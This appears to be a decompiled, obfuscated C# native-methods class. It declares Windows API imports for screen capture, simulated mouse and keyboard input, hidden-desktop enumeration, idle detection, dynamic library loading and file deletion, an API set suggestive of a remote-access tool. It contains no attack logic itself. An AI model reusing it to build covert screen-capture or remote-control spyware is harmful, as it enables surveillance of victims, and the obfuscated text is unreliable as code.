using System;
using System.Runtime.InteropServices;
using dg3ypDAonQcOidMs0w;
using zlqCXdcKao7YZQAGFe;

public static class GClass8
{
	public struct GStruct0
	{
		public static readonly int int_0;

		[MarshalAs(UnmanagedType.U4)]
		public uint uint_0;

		[MarshalAs(UnmanagedType.U4)]
		public uint uint_1;

		internal static object Qg5TxlasRC7NyReHAnx;

		static GStruct0()
		{
			WP6RZJql8gZrNhVA9v.prXoP4RuYp();
			vVX37AaQtZnGDwwSdDK();
			zAMjNjaTbadl0VOKqnr();
			ipL0pDaiXXuo3qyFi7M();
			int_0 = ef6teharqI7un42SYGi(DYZCCSa8ipTU8aCFpL3(kSQlZa9TWrZWUAWTnp.LkQixXdNRDLVn(33554499)));
		}

		internal static void vVX37AaQtZnGDwwSdDK()
		{
		}

		internal static void zAMjNjaTbadl0VOKqnr()
		{
		}

		internal static void ipL0pDaiXXuo3qyFi7M()
		{
		}

		internal static Type DYZCCSa8ipTU8aCFpL3(RuntimeTypeHandle runtimeTypeHandle_0)
		{
			return null;
		}

		internal static int ef6teharqI7un42SYGi(Type type_0)
		{
			return 0;
		}

		internal static bool JRxYRpau37mW16XXk2P()
		{
			return true;
		}

		internal static object YHn4JFaA39ZC8w4tiu8()
		{
			return null;
		}
	}

	public delegate bool GDelegate2(IntPtr hDesktop, IntPtr lParam);

	[DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	public static extern bool DeleteFile(string name);

	[DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
	public static extern IntPtr LoadLibrary([MarshalAs(UnmanagedType.LPStr)] string lpFileName);

	[DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	public static extern IntPtr GetProcAddress(IntPtr hModule, [MarshalAs(UnmanagedType.LPStr)] string procName);

	[DllImport("user32.dll")]
	public static extern bool GetLastInputInfo(ref GStruct0 plii);

	[DllImport("user32.dll")]
	public static extern bool SetCursorPos(int x, int y);

	[DllImport("user32.dll")]
	public static extern void mouse_event(uint dwFlags, int dx, int dy, int cButtons, int dwExtraInfo);

	[DllImport("user32.dll")]
	public static extern bool keybd_event(byte bVk, byte bScan, uint dwFlags, int dwExtraInfo);

	[DllImport("gdi32.dll", SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	public static extern bool BitBlt([In] IntPtr hdc, int nXDest, int nYDest, int nWidth, int nHeight, [In] IntPtr hdcSrc, int nXSrc, int nYSrc, int dwRop);

	[DllImport("gdi32.dll")]
	public static extern IntPtr CreateDC(string lpszDriver, string lpszDevice, string lpszOutput, IntPtr lpInitData);

	[DllImport("gdi32.dll")]
	public static extern bool DeleteDC([In] IntPtr hdc);

	[DllImport("msvcrt.dll", CallingConvention = CallingConvention.Cdecl)]
	public unsafe static extern int memcmp(byte* ptr1, byte* ptr2, uint count);

	[DllImport("msvcrt.dll", CallingConvention = CallingConvention.Cdecl, EntryPoint = "memcmp")]
	public static extern int memcmp_1(IntPtr ptr1, IntPtr ptr2, uint count);

	[DllImport("msvcrt.dll", CallingConvention = CallingConvention.Cdecl)]
	public static extern int memcpy(IntPtr dst, IntPtr src, uint count);

	[DllImport("msvcrt.dll", CallingConvention = CallingConvention.Cdecl, EntryPoint = "memcpy")]
	public unsafe static extern int memcpy_1(void* dst, void* src, uint count);

	[DllImport("user32.dll")]
	public static extern bool SystemParametersInfo(uint uAction, uint uParam, ref IntPtr lpvParam, uint flags);

	[DllImport("user32.dll", EntryPoint = "SystemParametersInfo")]
	public static extern bool SystemParametersInfo_1(uint uAction, uint uParam, ref bool lpvParam, uint flags);

	[DllImport("user32.dll")]
	public static extern int PostMessage(IntPtr hWnd, int wMsg, int wParam, int lParam);

	[DllImport("user32.dll")]
	public static extern IntPtr OpenDesktop(string hDesktop, int flags, bool inherit, uint desiredAccess);

	[DllImport("user32.dll")]
	public static extern bool CloseDesktop(IntPtr hDesktop);

	[DllImport("user32.dll")]
	public static extern bool EnumDesktopWindows(IntPtr hDesktop, GDelegate2 callback, IntPtr lParam);

	[DllImport("user32.dll")]
	public static extern bool IsWindowVisible(IntPtr hWnd);

	[DllImport("user32.dll")]
	public static extern IntPtr GetForegroundWindow();

	static GClass8()
	{
		WP6RZJql8gZrNhVA9v.prXoP4RuYp();
		WP6RZJql8gZrNhVA9v.iXLoKRSpAw();
	}
}
